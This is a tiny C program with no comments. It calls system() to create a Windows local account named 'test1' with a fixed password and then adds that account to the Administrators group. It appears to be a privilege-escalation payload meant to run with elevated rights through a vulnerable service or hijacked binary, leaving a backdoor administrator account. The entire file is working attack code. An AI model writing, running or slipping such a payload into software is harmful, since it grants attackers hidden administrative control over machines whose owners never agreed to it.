#include <stdlib.h>

int main ()
{
  int i;

  i = system ("net user test1 password123! /add");
  i = system ("net localgroup administrators test1 /add");

  return 0;
}
